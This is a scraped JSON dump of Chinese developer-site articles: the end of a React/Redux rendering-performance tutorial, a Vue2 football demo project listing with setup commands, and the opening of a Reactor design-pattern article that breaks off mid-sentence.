}\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e列表（\u003ccode\u003eitems\u003c/code\u003e）的数据结构是数组类型：\u003ccode\u003e[{id1, marked}, {id2, marked}, {id3, marked}]\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eApp\u003c/code\u003e渲染列表是通过遍历（\u003ccode\u003emap\u003c/code\u003e）列表数组\u003ccode\u003eitems\u003c/code\u003e实现的\u003c/li\u003e\n\u003cli\u003e当用户点击某一项时，把被点击项的\u003ccode\u003eid\u003c/code\u003e传递给\u003ccode\u003eitem\u003c/code\u003e的 reducer，reducer 通过遍历 \u003ccode\u003eitems\u003c/code\u003e，挨个对比\u003ccode\u003eid\u003c/code\u003e的方式找到需要被标记的项\u003c/li\u003e\n\u003cli\u003e重新标记完之后将新的数组返回\u003c/li\u003e\n\u003cli\u003e新的数组返回给\u003ccode\u003eApp\u003c/code\u003e，\u003ccode\u003eApp\u003c/code\u003e再次进行渲染\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e如果你没法将以上代码片段和我叙述的事实拼凑在一起，可以在 github 上找到\u003ca target=\"_blank\" href=\"https://github.com/somebody32/high-performance-redux/tree/gh-pages/assets/naive_list\"\u003e完整代码\u003c/a\u003e浏览或者运行。\u003c/p\u003e\n\u003cp\u003e对于这样的一个需求，相信绝大多数人的代码都是这么写的。\u003c/p\u003e\n\u003cp\u003e但是上述代码没有告诉你的事实时，这的性能很差。当你尝试点击某个选项时，选项的高亮会延迟至少半秒秒钟，用户会感觉到列表响应变慢了。\u003c/p\u003e\n\u003cp\u003e这样的延迟值并不是绝对：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e这样的现象只有在列表项数目众多的情况下出现，比如说 10k。\u003c/li\u003e\n\u003cli\u003e在开发环境（\u003ccode\u003eENV === 'development'\u003c/code\u003e）下运行的代码会比在生产环境（\u003ccode\u003eENV === 'production'\u003c/code\u003e）下运行较慢\u003c/li\u003e\n\u003cli\u003e我个人 PC 的 CPU 配置是 1700x，不同电脑配置的延迟会有所不同\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 class=\"heading\"\u003e诊断\u003c/h2\u003e\n\u003cp\u003e那么问题出在哪里？我们通过 Chrome 开发者工具一探究竟（还有很多其他的 React 相关的性能工具同样也能洞察性能问题，比如 react-addons-perf, \u003ca target=\"_blank\" href=\"https://github.com/garbles/why-did-you-update\"\u003ewhy-did-you-update\u003c/a\u003e，\u003ca target=\"_blank\" href=\"https://chrome.google.com/webstore/detail/react-developer-tools/fmkadmapgofadopljbjfkapdkoienihi?hl=en\"\u003eReact Developer Tools\u003c/a\u003e 等等。但都存在或多或少的存在缺陷，使用 Chrome 开发者工具是最靠谱的）\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e本地启动项目， 打开 Chrome 浏览器，\u003cstrong\u003e在地址栏以访问项目地址加上\u003ccode\u003ereact_perf\u003c/code\u003e后缀的方式访问项目页面\u003c/strong\u003e，比如我的项目地址是: http://localhost:3000/ 的话，实际请访问 http://localhost:8080/?react_perf 。加上\u003ccode\u003ereact_perf\u003c/code\u003e后缀的用意是启用 React 中的性能埋点，这些埋点用于统计 React 中某些操作的耗时，使用\u003ccode\u003eUser Timing API\u003c/code\u003e实现\u003c/li\u003e\n\u003cli\u003e打开 Chrome 开发者工具，切换到 performance 面板\n\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bc57c6f9a7b73?w=1124\u0026amp;h=727\u0026amp;f=png\u0026amp;s=46578\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003c/li\u003e\n\u003cli\u003e点击 performance 面板左上角的“录制”按钮，开始录制性能信息\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bc5b0dc916246?w=1118\u0026amp;h=722\u0026amp;f=png\u0026amp;s=45358\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e点击列表中的任意一项\u003c/li\u003e\n\u003cli\u003e等被点击项进入高亮状态时，点击“stop”按钮停止录制性能信息\n\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bc5b6f754adf4?w=1118\u0026amp;h=720\u0026amp;f=png\u0026amp;s=40861\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003c/li\u003e\n\u003cli\u003e接下来你就能看到点击阶段的性能大盘信息：\n\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bc5bea5665642?w=1122\u0026amp;h=626\u0026amp;f=png\u0026amp;s=49140\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e我们把目光聚焦到 CPU 活动最剧烈的那段时间内，\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bc5c9cb2dfcfc?w=989\u0026amp;h=734\u0026amp;f=png\u0026amp;s=66035\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e从图表中可以看出，这部分的时间（712ms）消耗基本是由脚本引起的，准确来说是由点击事件执行的脚本引起的，并且从函数的调用栈以及从时间排序中可以看出，时间基本上花费在\u003ccode\u003eupdateComponent\u003c/code\u003e函数中。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bc5db736ed86d?w=1454\u0026amp;h=641\u0026amp;f=png\u0026amp;s=82836\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e这已经能猜出一二，如果你还不确定这个函数究竟干了什么，不如展开\u003ccode\u003eUser Timing\u003c/code\u003e一栏看看更“通俗”的时间消耗\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bc5d730c12e6a?w=1200\u0026amp;h=298\u0026amp;f=png\u0026amp;s=15573\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e原来时间都花费在\u003ccode\u003eApp\u003c/code\u003e组件的更新上，每一次\u003ccode\u003eApp\u003c/code\u003e组件的更新，意味着每一个\u003ccode\u003eItem\u003c/code\u003e组件也都要更新，意味着每一个\u003ccode\u003eItem\u003c/code\u003e都要被重新渲染（执行\u003ccode\u003erender\u003c/code\u003e函数）\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e如果你依然觉得对以上说法表示怀疑，或者说难以想象，可以直接在\u003ccode\u003eApp\u003c/code\u003e组件的\u003ccode\u003erender\u003c/code\u003e函数和\u003ccode\u003eItem\u003c/code\u003e组件的\u003ccode\u003erender\u003c/code\u003e函数加上\u003ccode\u003econsole.log\u003c/code\u003e。那么每次点击时，你会看到\u003ccode\u003eApp\u003c/code\u003e里的\u003ccode\u003econsole\u003c/code\u003e和\u003ccode\u003eItem\u003c/code\u003e里的\u003ccode\u003econsole\u003c/code\u003e都调用了 10k 次。注意此时页面会响应的更慢了，因为在控制台输出 10k 次\u003ccode\u003econsole.log\u003c/code\u003e也是需要代价的\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e更重要的知识点在于，只要组件的状态（\u003ccode\u003eprops\u003c/code\u003e或者\u003ccode\u003estate\u003c/code\u003e）发生了更改，那么组件就会默认执行\u003ccode\u003erender\u003c/code\u003e函数重新进行渲染（你也可以通过重写\u003ccode\u003eshouldComponentUpdate\u003c/code\u003e手动阻止这件事的发生，这是后面会提到的优化点）。同时要注意的事情是，执行\u003ccode\u003erender\u003c/code\u003e函数并不意味着浏览器中的真实 DOM 树需要修改。浏览器中的真实 DOM 是否需要发生修改，是由 React 最后比较 Virtual Tree 决定的。\u003c/strong\u003e 我们都知道修改浏览器中的真实 DOM 是非常耗费性能的一件事，于是 React 为我们做出了优化。但是执行\u003ccode\u003erender\u003c/code\u003e的代价仍然需要我们自己承担\u003c/p\u003e\n\u003cp\u003e所以在这个例子中，每一次点击列表项时，都会引起 store 中\u003ccode\u003eitems\u003c/code\u003e状态的更改，并且返回的\u003ccode\u003eitems\u003c/code\u003e状态总是新的数组，也就造成了每次点击过后传递给\u003ccode\u003eApp\u003c/code\u003e组件的属性都是新的\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e反击\u003c/h2\u003e\n\u003cp\u003e请记住下面这个公式\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eUI = f(state)\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e你在页面上所见的，都是对状态的映射。反过来说，只要组件状态或者传递给组件的属性没有发生改变，那么组件也不会重新进行渲染。我们可以利用这一点阻止\u003ccode\u003eApp\u003c/code\u003e的渲染，只要保证转递给\u003ccode\u003eApp\u003c/code\u003e组件的属性不会发生改变即可。毕竟只修改一条列表项的数据却结果造成了其他 9999 条数据的重新渲染是不合理的。\u003c/p\u003e\n\u003cp\u003e但是应该如何做才能保证修改数据的同时传递给\u003ccode\u003eApp\u003c/code\u003e的数据不发生变化？\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e通过更改数据结构\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e原本所有的\u003ccode\u003eitems\u003c/code\u003e信息都存在数组结构里，数组结构的一个重要特性是保证了访问数据的顺序一致性。现在我们把数据拆分为两部分\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e数组结构\u003ccode\u003eids\u003c/code\u003e：只保留 id 用于记录数据顺序，比如:\u003ccode\u003e[id1, id2, id3]\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e字典（对象）结构\u003ccode\u003eitems\u003c/code\u003e：以\u003ccode\u003ekey-value\u003c/code\u003e的形式记录每个数据项的具体信息：\u003ccode\u003e{id1: {marked: false}, id2: {marked: false}}\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e关键代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eids\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003estate = [], action\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e state;\n}\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eitems\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003estate = {}, action\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003eswitch\u003c/span\u003e (action.type) {\n    \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"MARK\"\u003c/span\u003e:\n      \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e item = state[action.id];\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n        ...state,\n        [action.id]: { ...item, \u003cspan class=\"hljs-attr\"\u003emarked\u003c/span\u003e: !item.marked }\n      };\n    \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e:\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e state;\n  }\n}\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eitemsReducer\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003estate = {}, action\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n    \u003cspan class=\"hljs-attr\"\u003eids\u003c/span\u003e: ids(state.ids, action),\n    \u003cspan class=\"hljs-attr\"\u003eitems\u003c/span\u003e: items(state.items, action)\n  };\n}\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e store = createStore(itemsReducer);\n\n\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eApp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eComponent\u003c/span\u003e \u003c/span\u003e{\n  render() {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e { ids } = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.props;\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e (\n      \u003cspan class=\"xml\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        {ids.map(id =\u0026gt; {\n          return \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eItem\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ekey\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{id}\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{id}\u003c/span\u003e /\u0026gt;\u003c/span\u003e;\n        })}\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    );\n  }\n}\n\n// App.js:\nfunction mapStateToProps(state) {\n  return { ids: state.ids };\n}\n// Item.js\nfunction mapStateToProps(state, props) {\n  const { id } = props;\n  const { items } = state;\n  return {\n    item: items[id]\n  };\n}\n\nconst markItem = id =\u0026gt; ({ type: \"MARK\", id });\nexport default connect(mapStateToProps, { markItem })(Item);\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在这种思维模式下，\u003ccode\u003eItem\u003c/code\u003e组件直接与 Store 相连，每次点击时通过 id 直接找到\u003ccode\u003eitems\u003c/code\u003e状态字典中的信息进行修改。因为\u003ccode\u003eApp\u003c/code\u003e只关心\u003ccode\u003eids\u003c/code\u003e状态，而在这个需求中不涉及增删改，所以\u003ccode\u003eids\u003c/code\u003e状态永远不会发生改变，在\u003ccode\u003eMounted\u003c/code\u003e之后，\u003ccode\u003eApp\u003c/code\u003e再也不会更新了。所以现在无论你如何点击列表项，只有被点击的列表项会更新。\u003c/p\u003e\n\u003cp\u003e很多年前我写过一篇文章：\u003ca target=\"_blank\" href=\"http://qingbob.com/built-cache-management-module-in-nodejs/\"\u003e《在 Node.js 中搭建缓存管理模块》\u003c/a\u003e，里面提到过相同的解决思路，有更详细的叙述\u003c/p\u003e\n\u003cp\u003e在这一小节的结尾我要告诉大家一个坏消息：虽然我们可以精心设计状态的数据结构，但在实际工作中用来展示数据的控件，比如表格或者列表，都有各自独立的数据结构的要求，所以最终的优化效果并非是理想状态\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e阻止渲染的发生\u003c/h2\u003e\n\u003cp\u003e让我们回到最初发生事故的代码，它的问题在于每次在渲染需要高亮的代码时，无需高亮的代码也被渲染了一遍。如果能避免这些无辜代码的渲染，那么同样也是一种性能上的提升。\u003c/p\u003e\n\u003cp\u003e你肯定已经知道在 React 组件生命周期就存在这样一个函数 \u003ccode\u003eshoudlComponentUpdate\u003c/code\u003e 可以决定是否继续渲染，默认情况下它返回\u003ccode\u003etrue\u003c/code\u003e，即始终要重新渲染，你也可以重写它让它返回\u003ccode\u003efalse\u003c/code\u003e，阻止渲染。\u003c/p\u003e\n\u003cp\u003e利用这个生命周期函数，我们限定只允许\u003ccode\u003emarked\u003c/code\u003e属性发生前后发生变更的组件进行重新渲染：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eItem\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eComponent\u003c/span\u003e \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e() {\n    \u003cspan class=\"hljs-comment\"\u003e//...\u003c/span\u003e\n  }\n  shouldComponentUpdate(nextProps) {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.props[\u003cspan class=\"hljs-string\"\u003e\"marked\"\u003c/span\u003e] === nextProps[\u003cspan class=\"hljs-string\"\u003e\"marked\"\u003c/span\u003e]) {\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n    }\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\n  }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e虽然每次点击时\u003ccode\u003eApp\u003c/code\u003e组件仍然会重新渲染，但是成功阻止了其他 9999 个\u003ccode\u003eItem\u003c/code\u003e组件的渲染\u003c/p\u003e\n\u003cp\u003e事实上 React 已经为我们实现了类似的机制。你可以不重写\u003ccode\u003eshouldComponentUpdate\u003c/code\u003e， 而是选择继承\u003ccode\u003eReact.PureComponent\u003c/code\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eItem\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eReact\u003c/span\u003e.\u003cspan class=\"hljs-title\"\u003ePureComponent\u003c/span\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003ePureComponent\u003c/code\u003e与\u003ccode\u003eComponent\u003c/code\u003e不同在于它已经为你实现了\u003ccode\u003eshouldComponentUpdate\u003c/code\u003e生命周期函数，并且在函数对改变前后的 props 和 state 做了“浅对比”（shallow comparison），这里的“浅”和“浅拷贝”里的浅是同一个概念，即比较引用，而不比较嵌套对象里更深层次的值。话说回来 React 也无法为你比较嵌套更深的值，一方面这也耗时的操作，违背了\u003ccode\u003eshouldComponentUpdate\u003c/code\u003e的初衷，另一方面复杂的状态下决定是否重新渲染组件也会有复杂的规则，简单的比较是否发生了更改并不妥当\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e反面教材（anti-pattern）\u003c/h2\u003e\n\u003cp\u003e残酷的现实是，即使你理解了以上的知识点，你可能仍然对日常代码中的性能陷阱浑然不知，\u003c/p\u003e\n\u003cp\u003e比如设置缺省值的时候:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u0026lt;RadioGroup options={\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.props.options || []} /\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果每次 \u003ccode\u003ethis.props.options\u003c/code\u003e 值都是 \u003ccode\u003enull\u003c/code\u003e 的话，意味着每次传递给\u003ccode\u003e\u0026lt;RadioGroup /\u0026gt;\u003c/code\u003e都是字面量数组\u003ccode\u003e[]\u003c/code\u003e，但字面量数组和\u003ccode\u003enew Array()\u003c/code\u003e效果是一样的，始终生成新的实例，所以表面上看虽然每次传递给组件的都是相同的空数组，其实对组件来说每次都是新的属性，都会引起渲染。所以正确的方式应该将一些常用值以变量的形式保存下来：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e DEFAULT_OPTIONS = []\n\u0026lt;RadioGroup options={\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.props.options || DEFAULT_OPTIONS} /\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e又比如给事件绑定函数的时候\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u0026lt;Button onClick={\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.update.bind(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e)} /\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e或者\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u0026lt;Button\n  onClick={() =\u0026gt; {\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e\"Click\"\u003c/span\u003e);\n  }}\n/\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在这两种情况下，对于组件来说每次绑定的都是新的函数，所以也会造成重新渲染。关于如何在\u003ccode\u003eeslint\u003c/code\u003e中加入对\u003ccode\u003e.bind\u003c/code\u003e方法和箭头函数的检测，以及解决之道请参考\u003ca target=\"_blank\" href=\"https://github.com/yannickcr/eslint-plugin-react/blob/master/docs/rules/jsx-no-bind.md\"\u003eNo .bind() or Arrow Functions in JSX Props (react/jsx-no-bind)\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e结尾\u003c/h2\u003e\n\u003cp\u003e下一篇我们学习如何借助第三方类库，比如\u003ccode\u003eimmutablejs\u003c/code\u003e和\u003ccode\u003ereselect\u003c/code\u003e对项目进行优化\u003c/p\u003e\n\u003cp\u003e这篇文章同时也发表在我的 \u003ca target=\"_blank\" href=\"https://zhuanlan.zhihu.com/front-end\"\u003e知乎前端专栏\u003c/a\u003e，欢迎大家关注\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e参考资料\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://medium.freecodecamp.org/make-react-fast-again-tools-and-techniques-for-speeding-up-your-react-app-7ad39d3c1b82\"\u003eHigh Performance React: 3 New Tools to Speed Up Your Apps\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://building.calibreapp.com/debugging-react-performance-with-react-16-and-chrome-devtools-c90698a522ad\"\u003eDebugging React performance with React 16 and Chrome Devtools.\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://medium.com/@esamatti/react-js-pure-render-performance-anti-pattern-fb88c101332f\"\u003eReact.js pure render performance anti-pattern\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n","buildTime":"1515067378.0811","__v":0}
{"_id":{"$oid":"5a4e188de4919b0e782b4c75"},"id":"59bf1d37f265da064a0f2f23","author":{"$oid":"5a4e188de4919b0e782b4c73"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/9/18/37be1869ddb23aa526fc0f8fb7689840","https://user-gold-cdn.xitu.io/2017/9/18/edbb9cec73f99919c73abba0a9f0510c","https://user-gold-cdn.xitu.io/2017/9/18/eb1a09b9f088ee0dcadc527c52d342e5","https://user-gold-cdn.xitu.io/2017/9/18/c8ec3806979d7696c89acb5640675382"],"screenShot":null}],"title":"vue2 + vue-router+ es6，vue2最新SPA项目实战-仿懂球帝-爆炸足球","meta":{"likeCount":0},"tag":["Vue.js","ECMAScript 6","HTML"],"comment":[],"shortContent":"","content":"Vue2—\u003ca href=\"https://github.com/vqlai/vue2-football\" target=\"_blank\"\u003e爆炸足球\u003c/a\u003e 模仿懂球帝移动端官网，欢迎各位童鞋\u003ca href=\"https://github.com/vqlai/vue2-football\" target=\"_blank\"\u003estar\u003c/a\u003e\u003cdiv\u003e\u003cp\u003egithub地址：\u003ca href=\"https://github.com/vqlai/vue2-football\" target=\"_blank\"\u003ehttps://github.com/vqlai/vue2-football\u003c/a\u003e\u003c/p\u003e\u003cdiv\u003e\u003ch2\u003e技术栈\u003c/h2\u003e\u003cp\u003e前端 es6 vue2 vue-router2 axios better-scroll vue-lazyload stylus\u003c/p\u003e\u003cp\u003e后端 通过webpack 设置HTTP代理的方式请求懂球帝官网api获取数据\u003c/p\u003e\u003ch2\u003e项目截图\u003c/h2\u003e\u003cp\u003e\u003ca href=\"https://github.com/vqlai/vue2-football\" target=\"_blank\"\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/37be1869ddb23aa526fc0f8fb7689840\"\u003e\u003c/a\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://github.com/vqlai/vue2-football\" target=\"_blank\"\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/edbb9cec73f99919c73abba0a9f0510c\"\u003e\u003c/a\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://github.com/vqlai/vue2-football\" target=\"_blank\"\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/eb1a09b9f088ee0dcadc527c52d342e5\"\u003e\u003c/a\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://github.com/vqlai/vue2-football\" target=\"_blank\"\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/c8ec3806979d7696c89acb5640675382\"\u003e\u003c/a\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003ch3\u003e安装与运行\u003c/h3\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003egit \u003cspan class=\"hljs-built_in\"\u003eclone\u003c/span\u003e https://github.com/vqlai/vue2-football.git\n\n\u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e vue2-football\n\nnpm install（建议使用淘宝镜像cnpm）\n\nnpm run dev //服务端运行 访问 http://localhost:8080\n\nnpm run build 项目打包 \n\nnode server.js 运行打包后代码 \n\n有任何问题可以在这里提issue，谢谢你的支持。\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e欢迎各位童鞋star，飞机票：\u003ca href=\"https://github.com/vqlai/vue2-football\" target=\"_blank\"\u003eDEMO\u003c/a\u003e\u003c/p\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e","buildTime":"1515060964.9862","__v":0}
{"_id":{"$oid":"5a4e181827fe912a1025ce89"},"id":"5a4b57a56fb9a045186b1a8e","author":{"$oid":"5a4e181827fe912a1025ce7b"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/2/160b6cfed1e4c9c2?w=687\u0026h=481\u0026f=png\u0026s=75201"],"screenShot":null}],"title":"设计模式 in real world - 反应器模式(Reactor Pattern)","meta":{"likeCount":0},"tag":["设计模式","前端","设计","Node.js"],"comment":[],"shortContent":"从最早看的《Head First 设计模式》到后面看的一些书，里面对于设计模式的讲解大部分都是从抽象概念介绍一个设计模式是什么和一些例子。这些例子大多都是买咖啡(head first真的喜欢以咖啡举例)，玩具鸭子之类的。我也看过类似《Javascript设计模式与开发实践》，里…","content":"\u003ch1 class=\"heading\"\u003e前言\u003c/h1\u003e\n\u003cp\u003e从最早看的《Head First 设计模式》到后面看的一些书，里面对于设计模式的讲解大部分都是从抽象概念介绍一个设计模式是什么和一些例子。这些例子大多都是买咖啡(head first真的喜欢以咖啡举例)，玩具鸭子之类的。我也看过类似《Javascript设计模式与开发实践》，里面举例的时候会以一些作者实际开发中碰到的例子。这个系列是我日常学习中遇到设计模式的一个总结，希望能帮助到大家。\u003c/p\u003e\n\u003cp\u003e文章应该会在我的学习过程中不断更新。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e正文\u003c/h1\u003e\n\u003cp\u003e今天在研究《Node.js design patterns 2nd》的时候提到了反应器模式，我总结下自己所学和研究并写篇博客总结一下。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e反应器模式的介绍\u003c/h2\u003e\n\u003cp\u003e反应器设计模式(Reactor pattern)是一种为处理服务请求并发 提交到一个或者多个服务处理程序的事件设计模式。当请求抵达后，服务处理程序使用解多路分配策略，然后同步地派发这些请求至相关的请求处理程序。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThe reactor design pattern is an event handling pattern for handling service requests delivered concurrently to a service handler by one or more inputs. The service handler then demultiplexes the incoming requests and dispatches them synchronously to the associated request handlers. --GoF\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e反正我们不玩定义。我们先以一个餐饮店为例，假设每一个人来就餐就是一个I/O操作，他会先看一下菜单，然后点餐。就像一个网站会有很多的请求，要求服务器做一些事情。处理这些就餐事件的就是我们需要解决的问题了。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e多线程的并发解决方案\u003c/h3\u003e\n\u003cp\u003e在多线程处理的方式会是这样的：\u003c/p\u003e\n\u003cp\u003e一个人来就餐，一个服务员去服务，然后客人点菜。 